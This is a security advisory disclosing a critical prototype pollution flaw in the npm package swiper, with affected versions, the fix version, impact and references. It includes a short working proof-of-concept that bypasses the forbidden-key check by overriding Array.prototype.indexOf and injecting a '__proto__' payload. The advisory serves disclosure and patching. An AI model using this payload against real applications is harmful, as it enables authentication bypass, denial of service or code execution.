# [C] Prototype pollution in swiper

## Summary
Severity: Critical
Advisory: GHSA-hmx5-qpq5-p643
CVE: CVE-2026-27212
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-02-19
Source: https://github.com/advisories/GHSA-hmx5-qpq5-p643
Type: github-advisory

## Affected
- npm: `swiper` — affected >=6.5.1 <12.1.2

## Details
### Summary
A prototype pollution vulnerability exists in the the npm package swiper (>=6.5.1, < 12.1.2). Despite a previous fix that attempted to mitigate prototype pollution by checking whether user input contained a forbidden key, it is still possible to pollute `Object.prototype` via a crafted input using Array.prototype. The exploit works across Windows and Linux and on Node and Bun runtimes. This issue is fixed in version 12.1.2

### Details
The vulnerability resides in line 94 of shared/utils.mjs where indexOf() function is used to check whether user provided input contain forbidden strings.

### PoC
#### Steps to reproduce
1. Install latest version of swiper using npm install 
2. Run the following code snippet:
```javascript
var swiper = require('swiper');
Array.prototype.indexOf = () => -1;        
let obj = {};
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log({}.polluted);  // prints yes -> indicating that the patch was bypassed and prototype pollution occurred
```

#### Expected behavior
Prototype pollution should be prevented and {} should not gain new properties.
This should be printed on the console:
```
undefined
undefined OR throw an Error
```

#### Actual behavior
Object.prototype is polluted
This is printed on the console:
```
undefined 
yes
```

### Impact
This is a prototype pollution vulnerability, which can have severe security implications depending on how swiper is used by downstream applications. Any application that processes attacker-controlled input using this package may be affected.
It could potentially lead to the following problems:
1. Authentication bypass
2. Denial of service - Even if an attacker is not able to exploit prototype pollution in swiper, if there is a prototype pollution within the project from other dependencies, modifying global `Array.prototype.indexOf` property can result in crash when swiper.default.extendDefaults is called because swiper makes use of this global property. This can lead to Denial of Service.  
3. Remote code execution (if polluted property is passed to sinks like eval or child_process)

### Related CVEs
[CVE-2026-25521](https://github.com/advisories/GHSA-rxrv-835q-v5mh)
[CVE-2026-25047](https://github.com/advisories/GHSA-2733-6c58-pf27)
[CVE-2026-26021](https://github.com/advisories/GHSA-2c4m-g7rx-63q7)

## References
- https://github.com/nolimits4web/swiper/security/advisories/GHSA-hmx5-qpq5-p643
- https://nvd.nist.gov/vuln/detail/CVE-2026-27212
- https://github.com/nolimits4web/swiper/commit/d3e663322a13043ca63aaba235d8cf3900e0c8cf
- https://github.com/nolimits4web/swiper
- https://github.com/nolimits4web/swiper/releases/tag/v12.1.2
